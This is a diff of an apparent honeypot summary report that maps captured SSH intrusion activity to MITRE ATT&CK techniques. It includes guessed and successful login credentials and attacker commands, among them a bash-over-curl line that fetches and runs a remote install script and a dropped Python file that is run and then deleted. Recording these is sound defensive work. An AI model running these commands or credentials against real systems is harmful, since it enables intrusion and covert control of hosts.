@@ -1,26 +1,80 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-29 00:04:34",
+  "generated": "2026-08-29 01:01:11",
   "totals": {
-    "commands": 0,
-    "login_failed": 2,
-    "login_success": 0,
-    "sessions": 3
+    "commands": 6,
+    "login_failed": 27,
+    "login_success": 3,
+    "sessions": 30
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2,
+      "count": 27,
       "examples": [
         "ubuntu / Abdullah1234@",
-        "root / Admin999"
+        "root / Admin999",
+        "ubuntu / Password10",
+        "root / Abc@123456",
+        "admin / 1q2w3e4r5t"
       ],
       "first": "2026-08-29T00:01:28.806152Z",
-      "last": "2026-08-29T00:03:01.023575Z",
+      "last": "2026-08-29T00:58:21.896440Z",
+      "unique_ips": 8
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "count": 3,
+      "examples": [
+        "root / 123@@@",
+        "ubuntu / ubuntu"
+      ],
+      "first": "2026-08-29T00:22:29.262232Z",
+      "last": "2026-08-29T00:59:53.865163Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 2,
+      "examples": [
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
+      ],
+      "first": "2026-08-29T00:23:05.332392Z",
+      "last": "2026-08-29T00:23:05.594423Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "uname -a"
+      ],
+      "first": "2026-08-29T01:00:06.084418Z",
+      "last": "2026-08-29T01:00:06.084418Z",
       "unique_ips": 1
     }
   ],
-  "unmapped": []
+  "unmapped": [
+    [
+      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+      1
+    ],
+    [
+      "python3 /tmp/bendi.py",
+      1
+    ],
+    [
+      "rm /tmp/bendi.py",
+      1
+    ]
+  ]
 }
